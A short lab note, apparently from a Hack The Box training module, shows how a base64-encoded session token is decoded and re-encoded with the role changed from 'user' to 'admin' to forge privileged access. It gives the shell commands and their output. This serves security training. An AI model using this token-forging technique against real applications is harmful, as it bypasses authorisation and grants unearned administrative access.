# Predictable Session Tokens

## Decoding

```sh
my@attack:~$ echo -n dXNlcj1odGItc3R1ZGVudDtyb2xlPXVzZXI= | base64 -d
```

```output title="Output"
user=htb-student;role=user
```

## Encoding

```sh
my@attack:~$ echo -n 'user=htb-student;role=admin' | base64 -w 0
```

```output title="Output"
dXNlcj1odGItc3R1ZGVudDtyb2xlPWFkbWlu
```
